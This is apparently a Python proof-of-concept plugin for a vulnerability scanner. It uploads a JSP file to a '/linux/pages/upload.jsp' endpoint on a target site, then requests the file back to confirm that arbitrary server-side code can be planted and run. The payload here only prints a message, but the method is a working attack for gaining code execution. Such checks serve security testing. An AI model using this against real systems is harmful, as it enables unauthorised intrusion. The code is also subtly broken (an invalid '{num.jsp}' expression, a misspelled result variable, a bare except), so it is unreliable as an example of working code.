import requests
import urllib

from inc.generate_random import generate_random_number
def verify(url):
    relsult = {
        'name': '',
        'vulnerable': False,
        'url': url
    }
    num = generate_random_number(6)
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'filename': f'{num}.jsp',
        'Accept-Encoding': 'gzip'
    }
    data = '''<% out.println("The website has vulnerabilities!!");%>'''
    vurl = urllib.parse.urljoin(url, "/linux/pages/upload.jsp")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'success' in response.text:
            vurl = url + f'/linux/{num.jsp}'
            response = requests.get(vurl)
            if response.status_code == 200 and 'vulnerabilities' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult